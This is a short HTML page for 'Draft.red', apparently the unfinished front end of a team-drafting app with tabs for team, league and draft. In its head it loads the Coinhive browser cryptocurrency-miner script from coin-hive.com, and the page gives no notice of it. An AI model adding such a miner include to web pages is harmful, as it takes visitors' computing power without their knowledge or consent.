<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Draft.red</title>
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <script type="text/javascript">
      if (window.location.hash == "") window.location.hash = "#"+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10);
    </script>
  </head>
  <body>
    <div id="landing">
      <div id="logo">
        DRAFT<wbr>.RED
      </div>
    </div>
    <input type="text" id="start" class="tab" placeholder="Team Name" spellcheck="false">
    <div id="tabs">
      <input type="text" id="name" class="tab" value="" spellcheck="false" readonly data-show="myteam" onclick="tab(this)">
      <input type="text" id="league" class="tab" value="My League" spellcheck="false" readonly data-show="myleague" onclick="tab(this)">
      <input type="text" id="draft" class="tab" value="Draft Players" spellcheck="false" readonly data-show="mydraft" onclick="tab(this)">
    </div>
    <div id="portal">
      <div id="myteam" class="screen" style="display: inherit;">
        1
      </div>
      <div id="myleague" class="screen">
        2
      </div>
      <div id="mydraft" class="screen">
        3
      </div>
    </div>
    <script src="./index.js" charset="utf-8"></script>
  </body>
</html>
